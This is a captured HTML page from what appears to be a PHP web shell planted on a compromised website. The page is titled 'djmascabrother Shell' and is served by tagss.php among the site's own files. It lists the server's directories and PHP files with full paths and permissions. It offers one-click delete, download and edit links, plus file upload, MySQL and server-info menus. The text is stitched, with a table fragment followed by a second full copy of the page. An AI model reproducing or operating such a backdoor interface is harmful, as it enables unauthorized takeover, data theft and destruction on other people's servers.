                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::staff.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::tagcloud.php">tagcloud.php</a></td>
                    <td>Archivo</td>
                    <td>10.53 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/tagcloud.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/tagcloud.php::tagcloud.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::tagcloud.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::tagss.php">tagss.php</a></td>
                    <td>Archivo</td>
                    <td>50.48 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/tagss.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/tagss.php::tagss.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::tagss.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::terminos-y-condiciones.php">terminos-y-condiciones.php</a></td>
                    <td>Archivo</td>
                    <td>34.16 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/terminos-y-condiciones.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/terminos-y-condiciones.php::terminos-y-condiciones.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::terminos-y-condiciones.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::top.php">top.php</a></td>
                    <td>Archivo</td>
                    <td>32.88 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/top.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/top.php::top.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::top.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::trabajo.php">trabajo.php</a></td>
                    <td>Archivo</td>
                    <td>3.59 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/trabajo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/trabajo.php::trabajo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::trabajo.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::ultimos_comentarios.php">ultimos_comentarios.php</a></td>
                    <td>Archivo</td>
                    <td>899 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/ultimos_comentarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/ultimos_comentarios.php::ultimos_comentarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::ultimos_comentarios.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::usuarios.php">usuarios.php</a></td>
                    <td>Archivo</td>
                    <td>21.93 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/usuarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/usuarios.php::usuarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::usuarios.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::votar.php">votar.php</a></td>
                    <td>Archivo</td>
                    <td>2.71 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/votar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/votar.php::votar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::votar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::x.php">x.php</a></td>
                    <td>Archivo</td>
                    <td>10.22 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/x.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/x.php::x.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::x.php">Editar</a>
                    </td>
                    </tr></table><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    <link rel="shortcut icon" href="http://skynetx.cz.cc/tagss.php?imagen::icono" />
    <title>djmascabrother Shell en 209.190.85.12</title>
    <style type="text/css">
        *{padding:0;margin:0;border:0;}
        body{background:url(http://skynetx.cz.cc/tagss.php?imagen::fondo1) repeat;font-size:12px;font-family:tahoma;}
        input,select,option{background:url(http://skynetx.cz.cc/tagss.php?imagen::fondo2) repeat-x;font-size:12px;padding:3px;border:solid 1px #369;}
        select,option{height:25px;padding:-2px;border:solid 1px #369;}
        option{border:solid 1px #eee;}
        #menu,#pie,#ext_menu{width:100%;border-bottom:solid 1px #369;background:url(http://skynetx.cz.cc/tagss.php?imagen::fondo2) repeat-x;height:14px;padding:8px 0;text-align:center;}
        #menu a:link,#menu a:visited,#menu a:active,#pie a:link,#pie a:visited,#pie a:active,#pie span,#ext_menu a:link,#ext_menu a:visited,#ext_menu a:active,#ext_menu span{text-decoration:none;font-weight:bold;color:#369;padding:3px 10px 3px 28px;background-position:2px 2px;}
        #menu a:hover,#pie a:hover,#ext a:hover{padding:1px 9px 1px 27px;border:solid 1px #ddd;background-position:1px 0px;color:#333;}
        #ext_menu a:link,#ext_menu a:visited,#ext_menu a:active,#ext_menu span{padding:3px 28px 3px 28px;}
        #ext_menu a:hover{padding:1px 27px 1px 27px;border:solid 1px #c90;}
        #pie{border-top:solid 1px #369;}
        #pie input{background:url(http://skynetx.cz.cc/tagss.php?imagen::nombre) 4px 2px no-repeat;padding-left:24px;border:solid 1px #ddd;margin:-4px 10px;width:200px;color:#369;font-weight:bold;}
        #ext_menu{background:url(http://skynetx.cz.cc/tagss.php?imagen::fondo3) repeat-x;}
        #menu_logo,#pie_logo{background:url(http://skynetx.cz.cc/tagss.php?imagen::plugin2) 0px 10px no-repeat;float:left;width:48px;height:40px;display:block;z-index:999;margin-top:-18px;}
        #pie_logo{background:url(http://skynetx.cz.cc/tagss.php?imagen::servidor2) 4px 10px no-repeat;margin-bottom:-18px;overflow:hidden;display:fixed;z-index:999;}
        #guardar{background:url(http://skynetx.cz.cc/tagss.php?imagen::guardar) left no-repeat;}
        #resetear{background:url(http://skynetx.cz.cc/tagss.php?imagen::resetear) left no-repeat;}
        a#inicio{background:url(http://skynetx.cz.cc/tagss.php?imagen::inicio) left no-repeat;}
        a#subir_archivo{background:url(http://skynetx.cz.cc/tagss.php?imagen::subir) left no-repeat;}
        a#crear_carpeta{background:url(http://skynetx.cz.cc/tagss.php?imagen::carpeta) left no-repeat;}
        a#crear_archivo{background:url(http://skynetx.cz.cc/tagss.php?imagen::archivo) left no-repeat;}
        a#borrar{background:url(http://skynetx.cz.cc/tagss.php?imagen::error) left no-repeat;}
        a#descargar{background:url(http://skynetx.cz.cc/tagss.php?imagen::bajar) left no-repeat;}
        a#editar{background:url(http://skynetx.cz.cc/tagss.php?imagen::editar) left no-repeat;}
        a#mysql{background:url(http://skynetx.cz.cc/tagss.php?imagen::mysql) left no-repeat;}
        a#info{background:url(http://skynetx.cz.cc/tagss.php?imagen::info) left no-repeat;}
        a#servidor{background:url(http://skynetx.cz.cc/tagss.php?imagen::servidor) left no-repeat;}
        a#extensiones{background:url(http://skynetx.cz.cc/tagss.php?imagen::plugin) left no-repeat;}
        span#carga{background:url(http://skynetx.cz.cc/tagss.php?imagen::engranaje) left no-repeat;}
        table{margin:0;padding:0;width:100%;border-bottom:solid 1px #369;background:white;border-collapse: collapse;}
        table td{border:solid 1px #eee;color:#555;padding:2px 4px 2px 10px;}
        table tr:hover{background:#eee;}
        textarea{border:none;width:100%;height:500px;overflow:auto;}
        form span {color:#444;font-weight:bold;}
        .opciones{width:350px;}
        .ext_opciones{width:250px;}
        .opciones a:link,.opciones a:visited,.opciones a:active, .ext_opciones a:link,.ext_opciones a:visited,.ext_opciones a:active{padding:2px 18px;text-decoration:none;font-weight:bold;color:#369;background-position:2px 2px;font-size:10px;}
        .opciones a:hover, .ext_opciones a:hover{padding:-5px 9px;background-position:1px 1px;color:#black;}
        .primer_fila{padding-left:10px;font-weight:bold;color:#369;border:solid 1px #369;background:lightblue;}
        .permisos{color:#aaa;}
        .si_permisos{color:green;}
        .no_permisos{color:red;}
        .archivo{background:url(http://skynetx.cz.cc/tagss.php?imagen::archivo) center no-repeat;width:18px;height:18px;}
        .carpeta{background:url(http://skynetx.cz.cc/tagss.php?imagen::carpeta) center no-repeat;width:18px;height:18px;}
        .enlace{background:url(http://skynetx.cz.cc/tagss.php?imagen::enlace) center no-repeat;width:18px;height:18px;}
        .extension{background:url(http://skynetx.cz.cc/tagss.php?imagen::plugin) center no-repeat;width:18px;height:18px;}
        .contenedor,.error,.exito{width:100%;border-bottom:solid 1px #369;background:white;padding:5px 10px;text-align:center;}
        .error{background:#f66;color:white;font-weight:bold;}
        .exito{background:#0c9;color:white;font-weight:bold;}
    </style>
</head>

<body>
<div id="menu">
    <a id="inicio" href="http://skynetx.cz.cc/tagss.php">Inicio</a>
    <a id="subir_archivo" href="?subir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Subir archivo</a>
    <a id="crear_carpeta" href="?crear_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Crear carpeta</a>
    <a id="extensiones" href="?extensiones::inicio">Extensiones</a>
    <a id="info" href="?codigo"></a>
    </div><div id="ext_menu">
            <div id="menu_logo"></div><span> No hay ninguna extensión instalada aún.</span></div><table>
            <tr class="primer_fila">
                <td></td>
                <td>Nombre</td>
                <td>Tipo</td>
                <td>Tamaño</td>
                <td>Permisos</td>
                <td class="opciones">Opciones</td>
            </tr><tr valign="top">
                        <td class="enlace"></td>
                        <td><a href="?dir::">..</a></td>
                        <td>Enlace</td>
                        <td></td>
                        <td><span class="no_permisos">---------</span></td>
                        <td></td>
                    </tr><tr valign="top">
                        <td class="enlace"></td>
                        <td><a href="?dir::">.</a></td>
                        <td>Enlace</td>
                        <td></td>
                        <td><span class="no_permisos">---------</span></td>
                        <td></td>
                        </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/admin">admin</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/admin::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comunidades">comunidades</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comunidades::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/cuenta">cuenta</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/cuenta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/images">images</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/images::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/includes">includes</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/includes::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/lab">lab</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/lab::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mensajes">mensajes</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mensajes::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/notificaciones">notificaciones</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/notificaciones::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recaptcha">recaptcha</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recaptcha::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/rss">rss</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/rss::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/search">search</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/search::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/socialads">socialads</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/socialads::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::.htaccess">.htaccess</a></td>
                    <td>Archivo</td>
                    <td>3.81 KB</td>
                    <td><span class="si_permisos">rw-r--r--</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/.htaccess::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/.htaccess::.htaccess::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::.htaccess">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::404.php">404.php</a></td>
                    <td>Archivo</td>
                    <td>7.71 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/404.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/404.php::404.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::404.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::agregar.form.php">agregar.form.php</a></td>
                    <td>Archivo</td>
                    <td>12.8 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/agregar.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/agregar.form.php::agregar.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::agregar.form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::agregar.php">agregar.php</a></td>
                    <td>Archivo</td>
                    <td>2.65 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/agregar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/agregar.php::agregar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::agregar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::anuncie.form.php">anuncie.form.php</a></td>
                    <td>Archivo</td>
                    <td>3.27 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/anuncie.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/anuncie.form.php::anuncie.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::anuncie.form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::bloqueados-cambiar.php">bloqueados-cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>937 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/bloqueados-cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/bloqueados-cambiar.php::bloqueados-cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::bloqueados-cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::borrador.form.php">borrador.form.php</a></td>
                    <td>Archivo</td>
                    <td>14.15 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/borrador.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/borrador.form.php::borrador.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::borrador.form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::borradores.php">borradores.php</a></td>
                    <td>Archivo</td>
                    <td>2.52 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/borradores.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/borradores.php::borradores.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::borradores.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-google.php">buscador-google.php</a></td>
                    <td>Archivo</td>
                    <td>10.12 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-google.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-google.php::buscador-google.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-google.php">Editar</a>
